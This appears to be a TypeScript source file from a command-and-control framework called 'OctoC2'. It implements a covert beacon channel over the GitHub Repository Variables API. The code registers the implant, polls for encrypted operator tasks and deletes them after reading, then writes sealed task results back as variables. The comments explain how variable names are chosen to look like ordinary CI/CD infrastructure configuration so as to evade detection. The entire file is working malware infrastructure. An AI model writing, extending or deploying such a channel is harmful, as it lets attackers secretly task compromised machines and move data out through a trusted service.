/**
 * OctoC2 — SecretsTentacle  (Tentacle 7b — Variables API covert channel)
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Channel Overview
 * ────────────────────────────────────────────────────────────────────────────
 *
 * Uses GitHub Repository Variables API as a covert storage channel with
 * OPSEC-safe naming that blends into normal infrastructure configuration
 * variable management workflows.
 *
 * Note: GitHub Secrets API is write-only (cannot read secret values via API).
 * This tentacle uses the Repository Variables API instead. The name "Secrets"
 * reflects the OPSEC framing: variables are named as if they're infrastructure
 * configuration state — indistinguishable from legitimate CI/CD usage.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Variable Naming Scheme (OPSEC — blends with infra config management)
 * ────────────────────────────────────────────────────────────────────────────
 *
 *   ACK:     INFRA_CFG_{ID8}     = base64({ k: pubkey, t: ts })      (beacon writes)
 *   Tasks:   INFRA_STATE_{ID8}   = base64(encryptBox(Task[]))         (server writes)
 *   Results: INFRA_LOG_{TASKID8} = sealedB64                          (beacon writes)
 *
 * where {ID8} = first 8 chars of beaconId, {TASKID8} = first 8 chars of taskId.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Comparison with ActionsTentacle
 * ────────────────────────────────────────────────────────────────────────────
 *
 * ActionsTentacle uses: INFRA_STATUS_*, INFRA_JOB_*, INFRA_RESULT_*
 * SecretsTentacle uses: INFRA_CFG_*,   INFRA_STATE_*, INFRA_LOG_*
 *
 * Both channels use infrastructure-named variables that blend with
 * enterprise CI/CD pipeline variables and avoid project-identifying prefixes.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Availability
 * ────────────────────────────────────────────────────────────────────────────
 *
 * Availability is checked via a live API call: GET /repos/{owner}/{repo}/actions/variables.
 * Returns true on 200 (token has variables:read permission), false otherwise.
 * This is more permissive than ActionsTentacle (which requires GITHUB_TOKEN env var)
 * — any PAT with repo scope or a GitHub App installation token can use this channel.
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  bytesToBase64,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

export class SecretsTentacle extends BaseTentacle {
  readonly kind = "secrets" as const;

  private ackWritten = false;

  // ── Identity helpers ───────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  private get ackVarName(): string   { return `INFRA_CFG_${this.id8}`; }
  private get stateVarName(): string { return `INFRA_STATE_${this.id8}`; }

  private resultVarName(taskId: string): string {
    return `INFRA_LOG_${taskId.slice(0, 8)}`;
  }

  private get owner(): string { return this.config.repo.owner; }
  private get repo(): string  { return this.config.repo.name; }

  // ── Availability ───────────────────────────────────────────────────────────

  /**
   * Returns true when the Variables API list endpoint responds with 200.
   * This confirms the token has at minimum variables:read permission on
   * the target repository — sufficient to use this channel.
   */
  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.actions.listRepoVariables({
        owner: this.owner,
        repo:  this.repo,
        per_page: 1,
      });
      return true;
    } catch {
      return false;
    }
  }

  // ── Checkin ────────────────────────────────────────────────────────────────

  /**
   * 1. On first call: write ACK variable `INFRA_CFG_{ID8}` = base64({ k: pubkey, t: ts })
   * 2. Try GET `INFRA_STATE_{ID8}` variable.
   *    - If absent (404): return [].
   *    - If present: base64-decode → JSON parse { nonce, ciphertext } → decryptBox
   *      → parse Task[] → delete variable → return tasks.
   */
  async checkin(payload: CheckinPayload): Promise<Task[]> {
    // 1. First-call ACK registration
    if (!this.ackWritten) {
      const pubKeyB64 = await bytesToBase64(this.config.beaconKeyPair.publicKey);
      const ackRaw    = JSON.stringify({ k: pubKeyB64, t: payload.checkinAt });
      // base64-encode the ACK JSON so it looks like opaque config data
      const ackValue  = Buffer.from(ackRaw).toString("base64");

      try {
        await this.octokit.rest.actions.updateRepoVariable({
          owner: this.owner, repo: this.repo,
          name:  this.ackVarName,
          value: ackValue,
        });
      } catch (err: any) {
        if (err?.status === 404) {
          await this.octokit.rest.actions.createRepoVariable({
            owner: this.owner, repo: this.repo,
            name:  this.ackVarName,
            value: ackValue,
          });
        }
        // Other errors are swallowed — ACK is best-effort, not fatal
      }

      this.ackWritten = true;
    }

    // 2. Poll for state variable (contains encrypted task array)
    let rawValue: string;
    try {
      const resp = await this.octokit.rest.actions.getRepoVariable({
        owner: this.owner,
        repo:  this.repo,
        name:  this.stateVarName,
      });
      rawValue = resp.data.value?.trim() ?? "";
      if (!rawValue) return [];
    } catch (err: any) {
      if (err?.status === 404) return [];
      throw err;
    }

    // 3. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawValue) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        this.config.operatorPublicKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 4. Delete state variable (prevents re-delivery)
    try {
      await this.octokit.rest.actions.deleteRepoVariable({
        owner: this.owner,
        repo:  this.repo,
        name:  this.stateVarName,
      });
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ──────────────────────────────────────────────────────────

  /**
   * 1. sealBox(JSON.stringify(result), operatorPublicKey) → sealedB64
   * 2. Write variable `INFRA_LOG_{TASKID8}` = sealedB64
   */
  async submitResult(result: TaskResult): Promise<void> {
    const sealed  = await sealBox(JSON.stringify(result), this.config.operatorPublicKey);
    const varName = this.resultVarName(result.taskId);

    try {
      await this.octokit.rest.actions.updateRepoVariable({
        owner: this.owner, repo: this.repo,
        name:  varName,
        value: sealed,
      });
    } catch (err: any) {
      if (err?.status === 404) {
        await this.octokit.rest.actions.createRepoVariable({
          owner: this.owner, repo: this.repo,
          name:  varName,
          value: sealed,
        });
      } else {
        throw err;
      }
    }
  }

  // ── Teardown ───────────────────────────────────────────────────────────────

  /**
   * Best-effort cleanup: delete `INFRA_CFG_{ID8}` and `INFRA_STATE_{ID8}`
   * variables if they exist.  No throw on error.
   */
  override async teardown(): Promise<void> {
    for (const varName of [this.ackVarName, this.stateVarName]) {
      try {
        await this.octokit.rest.actions.deleteRepoVariable({
          owner: this.owner,
          repo:  this.repo,
          name:  varName,
        });
      } catch { /* best-effort */ }
    }
  }
}
